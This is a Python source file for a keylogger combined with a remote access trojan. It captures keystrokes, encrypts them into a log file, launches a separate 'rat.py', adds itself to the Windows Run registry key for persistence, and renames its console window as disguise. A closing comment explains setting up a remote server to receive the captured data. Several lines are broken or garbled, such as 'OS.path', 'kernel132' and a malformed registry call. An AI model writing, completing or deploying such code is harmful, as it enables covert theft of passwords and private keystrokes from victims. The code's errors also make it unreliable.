import threading 
import time
import requests
from pynput import keyboard
import os
import subprocess
import json
from cryptography.fernet import Fernet
import psutil
import sys
import ctypes

# configuration
WIFI_CHECK_INTERVAL = 10
KEYLOGGER_INTERVAL = 60
SERVER_URL = "http://your_server_ip/log"
# SERVER_URL = "http://192.168.1.100/log"  # Replace with your server IP and endpoint
RAT_SCRIPT_PATH = OS.path.join(os.getcwd(),"rat.py")
KEY_FILE = "key.key"
LOG_FILE = "keylog.txt"

key_log = []
wifi_connected = False
fernet = Fernet(Fernet.generate_key())

if not os.path.exists(KEY_FILE):
    with open(KEY_FILE,'wb') as key_file:
        key_file.write(fernet.key)

def on_press(key):
    try:
        key_log.append(key.char)
    except AttributeError: 
        key_log.append(str(key))

def on_release(key):
    if key == keyboard.key.esc:
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def check_wifi_connection():
    global wifi_connected
    while True: 
        try: 
            requests.get("http://www.google.com",timeout=5)
            wifi_connected = True
            break
        except requests.ConnectionError: 
            wifi_connected = False
            time.sleep(WIFI_CHECK_INTERVAL)

def send_data():
    global key_log, wifi_connected
    while True: 
        if wifi_connected: 
            data = "".join(key_log)
            if data: 
                encrypted_data = fernet.encrypt(data.encode())
                with open(LOG_FILE,'a') as log_file:
                    log_file.write(encrypted_data.decode())
                key_log = []
        time.sleep(KEYLOGGER_INTERVAL)

def start_rat():
    subprocess.Popen(["python",RAT_SCRIPT_PATH])

def collect_metadata():
    metadata = {
        "hostname" : os.uname()[1],
        "platform" : os.uname()[0],
        "release" : os.uname()[2],
        "version" : os.uname()[3],
        "machine" : os.uname()[4],
        "processor" : os.uname()[5],
        "location" : psutil.sensors_battery().percent
    }
    return metadata

def make_persistent():
    if sys.platform == "win32":
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,r,"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key,"EthicalKeylogger",0 , winreg.REG_SZ,sys.executable)
        winreg.CloseKey(key)

def anti_debugging():
    if sys.platform == "win32":
        ctypes.windll.kernel132.SetConsoleTitleW("Notepa")

def main():
    make_persistent()
    anti_debugging()
    check_wifi_thread = threading.Thread(target=check_wifi_connection)
    keylogger_thread = threading.Thread(target=start_keylogger)
    send_data_thread = threading.Thread(target=send_data)
    rat_thread = threading.Thread(target=start_rat)

    check_wifi_thread.start()
    keylogger_thread.start()
    send_data_thread.start()
    rat_thread.start()

    check_wifi_thread.join()
    keylogger_thread.join()
    send_data_thread.join()
    rat_thread.join()

if __name__ == "__main__":
    main()


''' Server IP Address: The server IP should point to a remote machine or a machine that is set up to receive the incoming data. This machine should be capable of securely receiving and processing the data from the keylogger or RAT. Examples of this could be:

A remote server that you control (for example, a cloud server).
A virtual machine (VM) that you own and have configured to handle the incoming data.
Any other machine on your network or remotely that is set up to receive, store, and process the data securely.
'''